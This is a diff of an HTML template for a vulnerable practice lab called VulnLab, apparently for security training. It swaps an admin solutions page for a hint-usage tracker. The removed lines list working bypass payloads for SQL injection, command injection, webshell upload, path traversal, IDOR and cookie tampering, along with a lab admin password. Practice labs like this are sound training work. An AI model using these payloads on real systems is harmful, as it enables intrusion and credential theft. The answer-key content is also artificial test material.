@@ -1,94 +1,64 @@
 {% extends "base.html" %}
-{% block title %}정답지 - VulnLab{% endblock %}
+{% block title %}힌트 사용유무 - VulnLab{% endblock %}
 {% block content %}
 <div class="card">
-  <h2>🗂 정답지 (Solutions)</h2>
-  <p class="muted" style="margin-bottom:1rem">이 페이지는 관리자 전용입니다. 각 취약점의 정확한 우회 방법과 목표를 설명합니다.</p>
+  <h2>💡 힌트 사용유무</h2>
+  <p class="muted" style="margin-bottom:1.5rem">각 챌린지에서 힌트 버튼을 클릭했는지 여부를 표시합니다. 힌트 사용 기록은 이 브라우저에만 저장됩니다.</p>
 
-  <!-- ── Challenge 1: SQL Injection ── -->
-  <div class="solution-card">
-    <h3>[02] SQL Injection — 공백 필터 우회 + UNION 덤프</h3>
-    <p class="solution-meta">페이지: <code>/search</code> &nbsp;|&nbsp; 필터: 공백(" ") 제거</p>
-    <p><b>기본 페이로드 (차단됨):</b></p>
-    <div class="payload">' OR 1=1--</div>
-    <p><b>실제 우회 페이로드:</b> 공백을 <code>/**/</code>로 대체</p>
-    <div class="payload">'/**/OR/**/1=1--</div>
-    <p><b>관리자 비밀번호 덤프 페이로드:</b></p>
-    <div class="payload">'/**/UNION/**/SELECT/**/id,username,password/**/FROM/**/users/**/WHERE/**/role='admin'--</div>
-    <p><b>획득 정보:</b> admin_PB 계정의 비밀번호 <code>PBKOR!@</code></p>
-    <span class="flag">🏁 FLAG: SQL Injection으로 admin_PB / PBKOR!@ 획득</span>
-  </div>
+  <div class="hint-status-grid" id="hintStatusGrid"></div>
 
-  <!-- ── Challenge 2: Command Injection ── -->
-  <div class="solution-card">
-    <h3>[03] Command Injection — ; &amp; 필터 우회</h3>
-    <p class="solution-meta">페이지: <code>/ping</code> &nbsp;|&nbsp; 필터: <code>;</code> 와 <code>&amp;</code> 제거</p>
-    <p><b>기본 페이로드 (차단됨):</b></p>
-    <div class="payload">127.0.0.1; id</div>
-    <p><b>실제 우회 페이로드:</b> <code>|</code> 파이프 사용</p>
-    <div class="payload">127.0.0.1| id</div>
-    <p><b>목표 파일 읽기 페이로드:</b></p>
-    <div class="payload">127.0.0.1|cat /app/data/secret.txt</div>
-    <p><b>획득 정보:</b> <code>/app/data/secret.txt</code> — 관리자 크리덴셜 (admin_PB / PBKOR!@)</p>
-    <span class="flag">🏁 FLAG: CMDi로 secret.txt 내용 출력 성공</span>
-  </div>
-
-  <!-- ── Challenge 3: File Upload ── -->
-  <div class="solution-card">
-    <h3>[04A] 파일 업로드 — 블랙리스트 대소문자 우회</h3>
-    <p class="solution-meta">페이지: <code>/upload</code> &nbsp;|&nbsp; 필터: 소문자 확장자 블랙리스트 (<code>php jsp asp aspx sh py rb pl</code>)</p>
-    <p><b>기본 페이로드 (차단됨):</b></p>
-    <div class="payload">webshell.php</div>
-    <p><b>실제 우회 페이로드:</b> 대문자 또는 혼합 대소문자 확장자 사용</p>
-    <div class="payload">webshell.PHP</div>
-    <div class="payload">webshell.PhP</div>
-    <div class="payload">webshell.phtml</div>
-    <p><b>원리:</b> 서버가 <code>ext in BLACKLIST_EXT</code>로만 검사하며 소문자 변환을 하지 않아 대소문자 혼용 시 통과</p>
-    <span class="flag">🏁 FLAG: .PHP / .phtml 확장자로 웹쉘 업로드 성공</span>
-  </div>
-
-  <!-- ── Challenge 4: Path Traversal ── -->
-  <div class="solution-card">
-    <h3>[04B] Path Traversal — ../ 단순 제거 우회</h3>
-    <p class="solution-meta">페이지: <code>/download</code> &nbsp;|&nbsp; 필터: <code>../</code> 를 한 번 제거</p>
-    <p><b>기본 페이로드 (차단됨):</b></p>
-    <div class="payload">../etc/passwd</div>
-    <p><b>실제 우회 페이로드:</b> <code>....//</code> 중첩 사용 (제거 후 <code>../</code> 재구성)</p>
-    <div class="payload">....//....//app/data/secret.txt</div>
-    <p><b>원리:</b> <code>....//</code>에서 <code>../</code>를 제거하면 <code>.../</code> → 실제로는 <code>../</code>가 남음</p>
-    <p><b>획득 정보:</b> <code>/app/data/secret.txt</code> — 관리자 크리덴셜</p>
-    <span class="flag">🏁 FLAG: Path Traversal로 secret.txt 읽기 성공</span>
-  </div>
-
-  <!-- ── Challenge 5: IDOR ── -->
-  <div class="solution-card">
-    <h3>[05] IDOR — URL 파라미터 직접 조작</h3>
-    <p class="solution-meta">페이지: <code>/mypage</code> &nbsp;|&nbsp; 필터: 없음 (인증 검사 자체가 없음)</p>
-    <p><b>기본 페이로드:</b></p>
-    <div class="payload">?user_id=1</div>
-    <p><b>원리:</b> 서버가 요청자 본인 여부를 확인하지 않고 <code>user_id</code> 파라미터를 그대로 DB 조회에 사용</p>
-    <p><b>우회 방법:</b> URL에서 <code>user_id</code> 값을 1~4로 변경하면 모든 사용자 정보 열람 가능</p>
-    <div class="payload">/mypage?user_id=1</div>
-    <p><b>획득 정보:</b> user_id=1 → admin_PB 계정의 이메일, 전화번호</p>
-    <span class="flag">🏁 FLAG: IDOR으로 다른 사용자 정보 열람 성공 (인식 챌린지)</span>
-  </div>
-
-  <!-- ── Challenge 6: Cookie Privilege Escalation ── -->
-  <div class="solution-card">
-    <h3>[06] 쿠키 권한 상승 — role 쿠키 변조</h3>
-    <p class="solution-meta">페이지: <code>/admin</code> &nbsp;|&nbsp; 필터: 없음 (쿠키를 서버 세션 없이 신뢰)</p>
-    <p><b>기본 페이로드 (현재 쿠키 상태):</b></p>
-    <div class="payload">role=user</div>
-    <p><b>실제 우회 페이로드:</b> 브라우저 개발자 도구에서 쿠키 값 변경</p>
-    <div class="payload">role=admin</div>
-    <p><b>우회 방법:</b></p>
-    <ol style="margin:.5rem 0 .5rem 1.5rem; color:#94a3b8; font-size:.88rem; line-height:1.8;">
-      <li>F12 → Application 탭 → Cookies → 현재 도메인 선택</li>
-      <li><code>role</code> 쿠키 값을 <code>user</code>에서 <code>admin</code>으로 변경</li>
-      <li><code>/admin</code> 페이지 새로고침</li>
-    </ol>
-    <p><b>원리:</b> 서버가 서명되지 않은 클라이언트 쿠키를 그대로 신뢰하며 세션 검증 없음</p>
-    <span class="flag">🏁 FLAG: role=admin 쿠키로 관리자 패널 접근 성공</span>
+  <div style="margin-top:1.5rem; text-align:right">
+    <button class="btn btn-secondary" onclick="resetHints()" style="font-size:0.85rem">기록 초기화</button>
   </div>
 </div>
+
+<script>
+const CHALLENGES = [
+  { key: 'sqli',      label: 'SQL Injection',    page: '/search'   },
+  { key: 'cmdi',      label: 'Command Injection', page: '/ping'     },
+  { key: 'upload',    label: '파일 업로드',        page: '/upload'   },
+  { key: 'traversal', label: 'Path Traversal',    page: '/download' },
+  { key: 'idor',      label: 'IDOR',              page: '/mypage'   },
+  { key: 'cookie',    label: '쿠키 권한 상승',     page: '/admin'    },
+];
+
+function renderStatus() {
+  const used = JSON.parse(localStorage.getItem('hintUsed') || '{}');
+  const grid = document.getElementById('hintStatusGrid');
+  grid.innerHTML = CHALLENGES.map(c => {
+    const isUsed = !!used[c.key];
+    return `
+      <div class="hint-status-item ${isUsed ? 'used' : 'not-used'}">
+        <span class="status-dot">${isUsed ? '🟡' : '🟢'}</span>
+        <span class="status-label">${c.label}</span>
+        <span class="status-badge">${isUsed ? '힌트 사용' : '미사용'}</span>
+        <a href="${c.page}" class="status-link">→ 이동</a>
+      </div>`;
+  }).join('');
+}
+
+function resetHints() {
+  if (confirm('힌트 사용 기록을 초기화하시겠습니까?')) {
+    localStorage.removeItem('hintUsed');
+    renderStatus();
+  }
+}
+
+renderStatus();
+</script>
+
+<style>
+.hint-status-grid { display: flex; flex-direction: column; gap: 0.6rem; }
+.hint-status-item {
+  display: flex; align-items: center; gap: 0.8rem;
+  padding: 0.75rem 1rem; border-radius: 6px; border: 1px solid #2d3748;
+}
+.hint-status-item.not-used { background: #1a2e1a; border-color: #2d5a2d; }
+.hint-status-item.used     { background: #2e2a1a; border-color: #5a4a2d; }
+.status-dot   { font-size: 1rem; }
+.status-label { flex: 1; font-weight: 500; }
+.status-badge { font-size: 0.78rem; padding: 0.15rem 0.6rem; border-radius: 12px; background: rgba(255,255,255,0.08); color: #94a3b8; }
+.status-link  { font-size: 0.82rem; color: #60a5fa; text-decoration: none; padding: 0.2rem 0.5rem; }
+.status-link:hover { text-decoration: underline; }
+</style>
 {% endblock %}
